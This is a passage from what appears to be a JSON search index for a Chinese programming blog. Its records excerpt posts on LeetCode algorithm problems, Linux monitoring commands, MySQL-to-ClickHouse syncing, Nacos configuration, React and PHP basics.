** 示例 2： 输入：nums1 = [2,5,1,2,5], nums2 = [10,5,2,1,5,2] 输出：3 示例 3： 输入：nums1 = [1,3,7,1,7,5], nums2 = [1,9,2,5,1] 输出：2 ** 在两条独立的水平线上按给定的顺序写下 nums1","lvl0":"lc.1035.不想交的线【最长公共上升子序列】","lvl1":null,"lvl2":"摘要","objectID":"ea9d2393d8c069e4f37ca815913b531e","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E7%8A%B6%E6%80%81%E8%BD%AC%E7%A7%BBdp%E6%9C%89%E5%90%91%E5%9B%BE%E7%9A%84%E6%9C%80%E5%A4%A7%E9%95%BF%E5%BA%A6/lc.1035.%E4%B8%8D%E6%83%B3%E4%BA%A4%E7%9A%84%E7%BA%BF%E6%9C%80%E9%95%BF%E5%85%AC%E5%85%B1%E5%AD%90%E5%BA%8F%E5%88%97%E5%8F%98%E9%A2%98/"},{"content":"1360. 日期之间隔几天 Difficulty: 简单 请你编写一个程序来计算两个日期之间隔了多少天。 日期以字符串形式给出，格式为 YYYY-MM-DD，如示例所示。 示例 1： 1","lvl0":"lc.1360.日期之间隔几天","lvl1":null,"lvl2":"摘要","objectID":"50c470b5c7bbadcde03b5941d027e44b","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%97%B6%E9%97%B4/lc.1360.%E6%97%A5%E6%9C%9F%E4%B9%8B%E9%97%B4%E9%9A%94%E5%87%A0%E5%A4%A9/"},{"content":"1363. 形成三的最大倍数 Difficulty: 困难 给你一个整数数组 digits，你可以通过按任意顺序连接其中某些数字来形成 3 的倍数，请你返回所能得到的最大的 3 的倍数。","lvl0":"lc.1363.形成3的最大倍数","lvl1":null,"lvl2":"摘要","objectID":"44c1bd0a214f29b2a9c2f34099040d50","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/01%E8%83%8C%E5%8C%85%E5%8F%98%E9%A2%98/lc.1363.%E5%BD%A2%E6%88%903%E7%9A%84%E6%9C%80%E5%A4%A7%E5%80%8D%E6%95%B0/"},{"content":"1367. 二叉树中的列表 Difficulty: 中等 给你一棵以 root 为根的二叉树和一个 head 为第一个节点的链表。 如果在二叉树中，存在一条一直向下的路径，且每个点的数值恰好一一对应","lvl0":"lc.1367.二叉树的列表","lvl1":null,"lvl2":"摘要","objectID":"b522744879726278c99397ab8c3cc691","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95-dfs-%E5%9B%9E%E6%BA%AF/%E9%80%92%E5%BD%92%E7%AE%97%E6%B3%95/lc.1367.%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%AD%E7%9A%84%E5%88%97%E8%A1%A8/"},{"content":"1390. 四因数 Difficulty: 中等 给你一个整数数组 nums，请你返回该数组中恰有四个因数的这些整数的各因数之和。 如果数组中不存在满足题意的整数，则返回 0 。 示例：","lvl0":"lc.1390.四因数","lvl1":null,"lvl2":"摘要","objectID":"72a202fd785703897b243ef97d3fab85","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%95%B0%E5%AD%A6/%E5%88%86%E8%A7%A3%E5%9B%A0%E6%95%B0%E4%B8%93%E9%A2%98/lc.1390.%E5%9B%9B%E5%9B%A0%E6%95%B0/"},{"content":"1392. 最长快乐前缀 Difficulty: 困难 「快乐前缀」是在原字符串中既是 非空 前缀也是后缀（不包括原字符串自身）的字符串。 给你一个字符串 s，请你返回它的 最长快乐前缀","lvl0":"lc.1392.最长快乐前缀","lvl1":null,"lvl2":"摘要","objectID":"6d08f86a8ae93d1b1acb33b5c13961a2","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%97%AE%E9%A2%98/kmp%E7%AE%97%E6%B3%95/lc.1392.%E6%9C%80%E9%95%BF%E5%BF%AB%E4%B9%90%E5%89%8D%E7%BC%80/"},{"content":"1957. 删除字符使字符串变好 Difficulty: 简单 一个字符串如果没有 三个连续 相同字符，那么它就是一个 好字符串 。 给你一个字符串 s ，请你从 s 删除 最少 的字符，使它变成一","lvl0":"lc.1957.删除字符串使字符串变好","lvl1":null,"lvl2":"摘要","objectID":"a21c3492558cd6e0208a2453d5fccf0d","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%97%AE%E9%A2%98/lc.1957.%E5%88%A0%E9%99%A4%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%BF%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E5%A5%BD/"},{"content":"1964. 找出到每个位置为止最长的有效障碍赛跑路线 Difficulty: **你打算构建一些障碍赛跑路线。给你一个 下标从 0 开始 的整数数组 obstacles ，数组长度为 n ，其中 obstacles[i] 表示第 i 个","lvl0":"lc.1964.找出到每个位置为止最长的有效障碍赛跑路线","lvl1":null,"lvl2":"摘要","objectID":"532c9baf2bcc504698b0d57fefec6967","tags":["算法学习","dp","最长上升子序列"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97%E6%A8%A1%E6%9D%BF%E9%A2%98/hard/lc.1964.%E6%89%BE%E5%87%BA%E5%88%B0%E6%AF%8F%E4%B8%AA%E4%BD%8D%E7%BD%AE%E4%B8%BA%E6%AD%A2%E6%9C%80%E9%95%BF%E7%9A%84%E6%9C%89%E6%95%88%E9%9A%9C%E7%A2%8D%E8%B5%9B%E8%B7%91%E8%B7%AF%E7%BA%BF/"},{"content":"289. 生命游戏 Difficulty: **根据 百度百科 ，生命游戏，简称为生命，是英国数学家约翰·何顿·康威在 1970 年发明的细胞自动机。 给定一个包含 m × n 个格子的面板，每一","lvl0":"lc.289.生命游戏","lvl1":null,"lvl2":"摘要","objectID":"d82876b5c14a7a5441dc9781531414f5","tags":["算法学习","dfs"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95-dfs-%E5%9B%9E%E6%BA%AF/289.%E7%94%9F%E5%91%BD%E6%B8%B8%E6%88%8F/"},{"content":"354. 俄罗斯套娃信封问题 Difficulty: 困难 给你一个二维整数数组 envelopes ，其中 envelopes[i] = [w\u0026lt;sub style=\u0026quot;display: inline;\u0026quot;\u0026gt;i\u0026lt;/sub\u0026gt;, h\u0026lt;sub style=\u0026quot;display: inline;\u0026quot;\u0026gt;i\u0026lt;/sub\u0026gt;] ，表示第 i 个信封的宽度和高度。 当另一个信封的宽度和高度都比这个信封大的","lvl0":"lc.354.俄罗斯套娃信封问题","lvl1":null,"lvl2":"摘要","objectID":"738acf3c0178c7ab4d9ffd7e068c227c","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97%E6%A8%A1%E6%9D%BF%E9%A2%98/lc.354.%E4%BF%84%E7%BD%97%E6%96%AF%E5%A5%97%E5%A8%83%E4%BF%A1%E5%B0%81%E9%97%AE%E9%A2%98/"},{"content":"368. 最大整除子集 Difficulty: 中等 给你一个由 无重复 正整数组成的集合 nums ，请你找出并返回其中最大的整除子集 answer ，子集中每一元素对 (answer[i], answer[j]) 都应当满足： answer[i] % answer[j] == 0 ，或 answer[j]","lvl0":"lc.368.最大整除子集","lvl1":null,"lvl2":"摘要","objectID":"379458dd6683c1a7bb053f7dd240e982","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97%E6%A8%A1%E6%9D%BF%E9%A2%98/lc.368.%E6%9C%80%E5%A4%A7%E6%95%B4%E9%99%A4%E5%AD%90%E9%9B%86/"},{"content":"leetcode 506.相对名次 506. 相对名次 Difficulty: **给你一个长度为 n 的整数数组 score ，其中 score[i] 是第 i 位运动员在比赛中的得分。所有得分都 互不相同 。 运动员将根据得分 决定","lvl0":"lc.506.相对名次","lvl1":null,"lvl2":"摘要","objectID":"4014d9d86af9580cb7ed73925b1c8a6b","tags":["算法学习"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%8E%92%E5%BA%8F%E4%B8%93%E9%A2%98/506.%E7%9B%B8%E5%AF%B9%E5%90%8D%E6%AC%A1/"},{"content":"最长上升子序列个数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 class Solution { public: int findNumberOfLIS(vector\u0026lt;int\u0026gt;\u0026amp; nums) { int n = nums.size(); vector\u0026lt;int\u0026gt; dp(n,1),cnt(n,1); int maxLen = 1; for(int i=1;i\u0026lt;n;++i) { for(int j=0;j\u0026lt;i;++j) { if(nums[j]\u0026lt; nums[i]) { if(dp[j] + 1\u0026gt; dp[i]) {","lvl0":"lc.673.最长上升子序列个数","lvl1":null,"lvl2":"摘要","objectID":"f061d0fd0ff6c2045d0c041e65f43e27","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E6%9C%80%E9%95%BF%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97%E6%A8%A1%E6%9D%BF%E9%A2%98/%E6%9C%80%E9%95%BF%E9%80%92%E5%A2%9E%E5%AD%90%E5%BA%8F%E5%88%97%E4%B8%AA%E6%95%B0/"},{"content":"740. 删除并获得点数 Difficulty: 中等 给你一个整数数组 nums ，你可以对它进行一些操作。 每次操作中，选择任意一个 nums[i] ，删除它并获得 nums[i] 的点数。之后，你必须删除 所有 等于","lvl0":"lc.740.删除并获得点数","lvl1":null,"lvl2":"摘要","objectID":"77159751fc8c28031456d246bb648498","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E7%8A%B6%E6%80%81%E8%BD%AC%E7%A7%BBdp%E6%9C%89%E5%90%91%E5%9B%BE%E7%9A%84%E6%9C%80%E5%A4%A7%E9%95%BF%E5%BA%A6/lc.740.%E5%88%A0%E9%99%A4%E5%B9%B6%E8%8E%B7%E5%BE%97%E7%82%B9%E6%95%B0/"},{"content":"978. 最长湍流子数组 Difficulty: 中等 当 A 的子数组 A[i], A[i+1], ..., A[j] 满足下列条件时，我们称其为_湍流子数组_： 若 i \u0026lt;= k \u0026lt; j，当 k 为奇数时， A[k] \u0026gt; A[k+1]，且当 k 为偶","lvl0":"lc.978. 最长湍流子数组","lvl1":null,"lvl2":"摘要","objectID":"b52d4e58fa0c0ba14745faca1245afa4","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-dp/%E7%8A%B6%E6%80%81%E8%BD%AC%E7%A7%BBdp%E6%9C%89%E5%90%91%E5%9B%BE%E7%9A%84%E6%9C%80%E5%A4%A7%E9%95%BF%E5%BA%A6/lc978.%E6%9C%80%E9%95%BF%E6%B9%8D%E6%B5%81%E5%AD%90%E6%95%B0%E7%BB%84/"},{"content":"1395. 统计作战单位数 Difficulty: ** n 名士兵站成一排。每个士兵都有一个 独一无二 的评分 rating 。 每 3 个士兵可以组成一个作战单位，分组规则如下： 从队伍中选出下标分别为","lvl0":"lc.生存人数【树状数组】","lvl1":null,"lvl2":"摘要","objectID":"0ae3bb9a287912070c4ab0899d286b17","tags":["算法学习","树状数组"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8C%BA%E9%97%B4%E9%97%AE%E9%A2%98/lc.1395.%E7%BB%9F%E8%AE%A1%E4%BD%9C%E6%88%98%E5%8D%95%E4%BD%8D%E6%95%B0/"},{"content":"面试题 16.10. 生存人数 Difficulty: **给定 N 个人的出生年份和死亡年份，第 i 个人的出生年份为 birth[i]，死亡年份为 death[i]，实现一个方法以计算生","lvl0":"lc.生存人数【树状数组】","lvl1":null,"lvl2":"摘要","objectID":"a512e0f974589eb3f41c23000a7c9fb5","tags":["算法学习","树状数组"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E5%8C%BA%E9%97%B4%E9%97%AE%E9%A2%98/lc.16.10%E7%94%9F%E5%AD%98%E4%BA%BA%E6%95%B0/"},{"content":"LCP 12. 小张刷题计划 Difficulty: 中等 为了提高自己的代码能力，小张制定了 LeetCode 刷题计划，他选中了 LeetCode 题库中的 n 道题，编号从 0 到 n-1，并计划在 m 天内按照题目编号顺","lvl0":"LCP12.小张的刷题计划","lvl1":null,"lvl2":"摘要","objectID":"bd6cb43c651263bfd0c28d8f1b92a5a4","tags":null,"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E4%BA%8C%E5%88%86%E6%B3%95/lcp12.%E5%B0%8F%E5%BC%A0%E7%9A%84%E5%88%B7%E9%A2%98%E8%AE%A1%E5%88%92/"},{"content":"linux 进程 内存原理 1 2 3 # 查看页表大小 getconf PAGE_SIZE # 答案是 4096 ，单位是 k 虚拟内存 和 物理内存 会有映射关系 linux 使用的是多级索引页表 Linux采用了一种同时适用于","lvl0":"linux 进程内存原理","lvl1":null,"lvl2":"摘要","objectID":"e813496a9aaa89c7e2176d62dd591de7","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E7%90%86%E8%AE%BA%E5%AD%A6%E4%B9%A0/%E8%AF%BE%E5%A4%96%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/linux%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98%E5%8E%9F%E7%90%86/"},{"content":"linux监控常用目录 CPU性能 1 2 3 4 top htop uptime vmstat 内存 1 free 磁盘 1 2 iotop df 网络、进程 1 2 3 4 iftop nethgos ps pstree 提示找不到 yum安装包的解决方法 在Linux系","lvl0":"linux监控常用目录","lvl1":null,"lvl2":"摘要","objectID":"7817fe2ee1ab6ee868b24e3801f2615d","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B7%A5%E5%85%B7/zabbix/linux%E7%9B%91%E6%8E%A7%E5%B8%B8%E7%94%A8%E7%9B%AE%E5%BD%95/"},{"content":"lru 通过linkedhashmap，hash中的节点用双向指针连接着，表示插入的顺序。因此保存这个顺序就可以每次都去除最久未使用的那个。 1 2 3","lvl0":"LRU【网友收集】","lvl1":null,"lvl2":"摘要","objectID":"935ce910224c491577b8f54d51a2eee6","tags":["数据结构"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E9%93%BE%E8%A1%A8/lru/"},{"content":"mysql同步 clickhouse解决方案 clickhouse 设置时区 参考博客 参考文档 1 CREATETABLEtmpENGINE=MergeTreeORDERBYidASSELECT*FROMmysql(\u0026#39;hostip:3306\u0026#39;,\u0026#39;db\u0026#39;,\u0026#39;table\u0026#39;,\u0026#39;user\u0026#39;,\u0026#39;passwd\u0026#39;); 可以先创建一个更具时间的临时表，然后同步完成后再删除 测试记录 【导入单","lvl0":"mysql将数据写入 clickhouse","lvl1":null,"lvl2":"摘要","objectID":"39eae72b77d912e4c0d78be2151d66b5","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B7%A5%E5%85%B7/clickhouse/%E5%85%B6%E4%BB%96/mysql%E5%90%8C%E6%AD%A5-clickhouse%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"},{"content":"nacos学习 配置 xml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 \u0026lt;parent\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-parent\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.0.4.RELEASE\u0026lt;/version\u0026gt; \u0026lt;relativePath/\u0026gt; \u0026lt;/parent\u0026gt; \u0026lt;properties\u0026gt; \u0026lt;spring-cloud.version\u0026gt;Finchley.SR2\u0026lt;/spring-cloud.version\u0026gt; \u0026lt;spring-cloud-alibaba.version\u0026gt;0.2.0.RELEASE\u0026lt;/spring-cloud-alibaba.version\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;dependencyManagement\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-alibaba-dependencies\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${spring-cloud-alibaba.version}\u0026lt;/version\u0026gt; \u0026lt;type\u0026gt;pom\u0026lt;/type\u0026gt; \u0026lt;scope\u0026gt;import\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-dependencies\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${spring-cloud.version}\u0026lt;/version\u0026gt; \u0026lt;type\u0026gt;pom\u0026lt;/type\u0026gt; \u0026lt;scope\u0026gt;import\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/dependencyManagement\u0026gt; https://www.bilibili.com/video/BV1LQ4y127n4?p=18 Nacos 可以","lvl0":"Nacos学习","lvl1":null,"lvl2":"摘要","objectID":"850cab4063f0e89b16aefe86a22685a3","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/java/springcloud/nacos%E5%AD%A6%E4%B9%A0/"},{"content":"参考学习视频 千峰的视频 利用 props.children 代替原来路由的写法","lvl0":"nextjs学习","lvl1":null,"lvl2":"摘要","objectID":"8d9f88df868e570d73cb7287ba0edbab","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/nextjs/nextjs%E5%AD%A6%E4%B9%A0/"},{"content":"pagination分页组件 14分钟","lvl0":"pagination分页","lvl1":null,"lvl2":"摘要","objectID":"2c7d6e7b4ca223929cb0feca6a7205ab","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/antd%E4%BD%BF%E7%94%A8/pagination%E5%88%86%E9%A1%B5/"},{"content":"学习视频 参考 27分钟 自动刷新事件——27分钟","lvl0":"Pagination分页插件","lvl1":null,"lvl2":"摘要","objectID":"d7c4f71f4e36d5e0c4616fa0420eae65","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/vue/elment-admin%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/pagination%E5%88%86%E9%A1%B5/"},{"content":"设置面板字体 点击 工具，常规选项， 设置字体大小 设置 preview sql字体 工具-\u0026gt; 常规选项 -\u0026gt; 字体 -\u0026gt; Code editor -\u0026gt; 设置大小","lvl0":"Pd 设置界面字体","lvl1":null,"lvl2":"摘要","objectID":"cd15a14eab86768516e7c7537bfa423a","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E5%BC%80%E5%8F%91%E8%BD%AF%E4%BB%B6/powerdesigner%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1/powerdesigner%E8%AE%BE%E7%BD%AE%E7%95%8C%E9%9D%A2%E5%AD%97%E4%BD%93/"},{"content":"PHP 变量学习 学习教程 1 2 3 4 5 6 \u0026lt;?php $s= \u0026#34;hello world\u0026#34;; echo \u0026#34;s -\u0026gt; $s\u0026#34;; echo $abc; 注意： 语句后面要写分号 变量定义就写 $ 开头 单引号不解析变量，双引号解析变量 变量类型定义 整型 浮","lvl0":"PHP 变量","lvl1":null,"lvl2":"摘要","objectID":"d5d1cefca7b422951ceadb1b90c8ccd3","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/php/%E5%8F%98%E9%87%8F/"},{"content":"PHP 链接数据库 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \u0026lt;?php $link = mysqli_connect(\u0026#39;localhost\u0026#39;,\u0026#39;test_php\u0026#39;,\u0026#39;test_php\u0026#39;); //var_dump( $link); if (!$link ) { exit(\u0026#39;数据库连接失败\u0026#39;","lvl0":"PHP 链接数据库","lvl1":null,"lvl2":"摘要","objectID":"cffbf4e59270766cf2a61bb268fc3fb8","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/php/php-%E9%93%BE%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"content":"Power designer 几个选项介绍 P即primary，主键的意思 F即foreign key，外键的意思 M即mandatory，强制不可为空的意思","lvl0":"Powerdesigner的几个选项","lvl1":null,"lvl2":"摘要","objectID":"2028df20c26eeba64934de4f8462d562","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E5%BC%80%E5%8F%91%E8%BD%AF%E4%BB%B6/powerdesigner%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1/powerdesigner%E7%9A%84%E5%87%A0%E4%B8%AA%E9%80%89%E9%A1%B9/"},{"content":"父路由 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67","lvl0":"react router 管理","lvl1":null,"lvl2":"摘要","objectID":"afc1e3064c7d6fbe42ce01c63486a96d","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/react%E5%9F%BA%E7%A1%80/react-router-%E7%AE%A1%E7%90%86/"},{"content":"集成markdown编辑器 官网示例 1 2 yarn add react-mde yarn add showdown textarea 根据内容自动扩充 【不需要用户手动拉】 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26","lvl0":"react 集成 markdown编辑器","lvl1":null,"lvl2":"摘要","objectID":"f68bdc3955c9453f9c40befe4f2f5b1b","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/%E6%AF%95%E4%B8%9A%E8%AE%BA%E6%96%87/%E9%9B%86%E6%88%90markdown%E7%BC%96%E8%BE%91%E5%99%A8/"},{"content":"集成 tinymce 1 yarn add @tinymce/tinymce-react 参考参考 参考文档 集成 ck editor 参考文档","lvl0":"react 集成 tinymce","lvl1":null,"lvl2":"摘要","objectID":"1a228d31b892d75cc7fa96890c4b1250","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/%E6%AF%95%E4%B8%9A%E8%AE%BA%E6%96%87/%E9%9B%86%E6%88%90tinymce/"},{"content":"react 刷新路由的方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import {withRouter} from \u0026#39;react-router-dom\u0026#39; //头顶部分 头像和 菜单 const TopRightMenu = () =\u0026gt; { // const history = createHashHistory() console.log(props) const Jump = (e)","lvl0":"react 刷新路由","lvl1":null,"lvl2":"摘要","objectID":"cd82892d56e66481ad99ad4a7c6acfe7","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/react%E5%9F%BA%E7%A1%80/react-%E5%88%B7%E6%96%B0%E8%B7%AF%E7%94%B1/"},{"content":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import { Form } from \u0026#34;react-bootstrap\u0026#34;; const Editor0 = (props) =\u0026gt; { if (props.init) { props.init({ getContent:()=\u0026gt; getContent() }) } } const App = ()=\u0026gt; { return ( \u0026lt;\u0026gt; \u0026lt;Editor0 init={( a) =\u0026gt; console.log(\u0026#39;init ref\u0026#39;,a)} /\u0026gt; \u0026lt;/\u0026gt; ) } 这样 通过回调 就能获得子组","lvl0":"react 子组件暴露接口给父组件","lvl1":null,"lvl2":"摘要","objectID":"e32cfbd717b0effd0294c5b89e111b3a","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/%E6%AF%95%E4%B8%9A%E8%AE%BA%E6%96%87/react%E5%AD%90%E7%BB%84%E4%BB%B6%E6%9A%B4%E9%9C%B2%E6%8E%A5%E5%8F%A3%E7%BB%99%E7%88%B6%E7%BB%84%E4%BB%B6/"},{"content":"React.lazy 和 React.Suspense 可以做 注意了： lazy 不能单独出现，要配合 Suspense 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48","lvl0":"react 组件懒加载","lvl1":null,"lvl2":"摘要","objectID":"86cae56326d6c282b531cf724b5102f1","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/react/react%E5%9F%BA%E7%A1%80/react-%E7%BB%84%E4%BB%B6%E6%87%92%E5%8A%A0%E8%BD%BD/"},{"content":"参考学习教程 参考教程， 10分开始 组件 css样式互不覆盖解决方法 